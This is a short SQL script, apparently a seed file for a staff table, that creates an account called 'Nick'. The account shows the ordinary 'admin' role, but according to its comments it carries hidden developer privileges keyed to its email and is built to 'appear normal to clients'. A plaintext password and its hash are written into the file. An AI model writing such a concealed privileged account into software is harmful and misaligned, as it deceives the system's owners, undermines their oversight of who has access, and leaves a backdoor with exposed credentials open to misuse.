-- =====================================
-- HIDDEN DEV USER SETUP
-- =====================================
-- Creates a user that appears as admin but has hidden dev privileges

-- Delete existing user if exists
DELETE FROM staff WHERE email = 'nick@neurodivers.ca';

-- Insert the user with 'admin' role (appears normal to clients)
-- Password: Dev@2024!
INSERT INTO staff (
  id,
  email,
  name,
  password_hash,
  role,
  phone,
  is_active,
  created_at,
  updated_at
) VALUES (
  'admin-' || lower(hex(randomblob(8))),
  'nick@neurodivers.ca',
  'Nick',  -- Simple name, no "Developer" title
  '$2b$12$.dIWZ2vytoBbA/RtKFepW.XUlMBx3MfqVOQm.zTPV5ng5SWxnYjdC',
  'admin',  -- Appears as regular admin in database
  NULL,
  1,
  datetime('now'),
  datetime('now')
);

-- Verify the user was created
SELECT id, email, name, role, is_active FROM staff WHERE email = 'nick@neurodivers.ca';

-- =====================================
-- CREDENTIALS:
-- Email: nick@neurodivers.ca
-- Password: Dev@2024!
-- Database Role: admin (visible to clients)
-- Actual Role: dev (hidden, determined by email)
-- =====================================
